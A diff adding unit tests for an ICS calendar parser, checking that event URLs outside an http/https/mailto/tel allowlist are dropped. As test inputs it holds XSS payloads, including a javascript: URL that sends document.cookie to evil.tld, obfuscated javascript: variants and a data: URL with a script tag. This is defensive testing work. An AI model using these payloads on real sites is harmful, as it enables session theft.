@@ -74,6 +74,62 @@ describe("parseIcsEvents", () => {
   });
 });
 
+/**
+ * B53 — the `URL:` property of a VEVENT is third-party input: it comes from a
+ * calendar feed the user subscribes to, is stored as-is by the calendar action
+ * and ends up in an anchor `href` in the meetings sidebar. A `javascript:`
+ * value would therefore run in the app's own origin. The parser drops every
+ * URL that is not on the shared `http|https|mailto|tel` allowlist
+ * (`sanitizeHref` in `src/lib/validation.ts`), so the hostile value is never
+ * stored in the first place.
+ */
+describe("parseIcsEvents — URL property", () => {
+  const feed = (url: string) =>
+    [
+      "BEGIN:VCALENDAR",
+      "BEGIN:VEVENT",
+      "UID:evt-1@noema",
+      "SUMMARY:Quarterly review",
+      `URL:${url}`,
+      "DTSTART:20260115T090000Z",
+      "END:VEVENT",
+      "END:VCALENDAR",
+    ].join("\r\n");
+
+  const urlOf = (value: string) => parseIcsEvents(feed(value))[0]?.url ?? null;
+
+  it("keeps an https URL", () => {
+    expect(urlOf("https://example.com/meet")).toBe("https://example.com/meet");
+  });
+
+  it("keeps a mailto and a tel URL", () => {
+    expect(urlOf("mailto:team@example.com")).toBe("mailto:team@example.com");
+    expect(urlOf("tel:+33123456789")).toBe("tel:+33123456789");
+  });
+
+  it("drops a javascript: URL", () => {
+    expect(urlOf("javascript:alert(1)")).toBeNull();
+    expect(urlOf("javascript:fetch('https://evil.tld/?c='+document.cookie)")).toBeNull();
+  });
+
+  it("drops an obfuscated javascript: URL", () => {
+    expect(urlOf("java\tscript:alert(1)")).toBeNull();
+    expect(urlOf("  javascript:alert(1)")).toBeNull();
+    expect(urlOf("JavaScript:alert(1)")).toBeNull();
+  });
+
+  it("drops every other scheme", () => {
+    expect(urlOf("data:text/html,<script>alert(1)</script>")).toBeNull();
+    expect(urlOf("vbscript:msgbox(1)")).toBeNull();
+    expect(urlOf("ftp://example.com/meet")).toBeNull();
+    expect(urlOf("//evil.tld/meet")).toBeNull();
+  });
+
+  it("drops an empty URL", () => {
+    expect(urlOf("")).toBeNull();
+  });
+});
+
 describe("parseIcsDate", () => {
   it("parses date values and utc date-times", () => {
     expect(parseIcsDate("20260116", {})).toEqual({
